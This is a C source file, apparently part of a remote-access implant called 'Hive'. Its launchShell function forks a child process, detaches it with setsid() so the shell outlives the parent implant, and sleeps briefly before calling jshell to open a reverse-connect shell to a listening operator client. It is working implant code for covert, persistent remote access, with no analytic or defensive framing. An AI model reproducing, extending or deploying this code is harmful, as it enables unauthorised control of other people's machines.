#include "launchshell.h"
#include "compat.h"
#include "bzlib.h"
#include "proj_strings.h"
#include "debug.h"

#include <unistd.h>
#include "jshell.h"
#include "threads.h"
#include "daemonize.h"

int launchShell( char *charinput )
{
	pid_t cpid;
	DLX(1, printf("Calling jshell with parameters: %s\n", charinput));

// fork_process could be used, but would work best if some refactoring
// where done. fork_process() tries to keep the same function prototype
// as pthread_create(), but fork_process() needs to support additional
// options, to be more universal.  in this case, fork_process() can't
// call waitpid() because it needs to return SUCCESS ASAP so the client
// can start the listening shell process
/* 
	if ( fork_process( jshell, (void *)charinput ) != SUCCESS )
	{
		D( printf( " ! ERROR: failed to fork jshell\n" ); )
		return FAILURE;
	}
*/

	if ((cpid = fork()) == 0) {
		// CHILD
		DLX(2, printf("This is the child process\n"));

		// by calling setsid(), if the parent hive process is killed,
		// the shell connection will stay active.  if not using daemonize()
		// then setsid() will need to be called.
		setsid();

		// TODO: ??? create and call a daemonlite() function that doesn't close open file descriptors
		// otherwise, the child closes the existing network connection it needs to send data through
//		daemonize();

		// sleeping allows the parent to return success to the client
		// the client does not open a listening shell until receiving
		// a response from the server.  this maximizes the chance that
		// a client will be listening for the server's reverse connect
		sleep( 1 );

		jshell( (void *)charinput );

		// shell process needs to exit.  the caller is not expecting
		// to handle a return after the shell is finished.
		DLX(2, printf("Exiting the shell process\n"));
		exit( 0 );
	}
	else
	{
		// PARENT
		DLX(2, printf("This is the parent process; PID of child: %u\n", (unsigned int)cpid));

		// parent connection continues to handle the connection with the Hive ILM client
	}

	return SUCCESS;
}

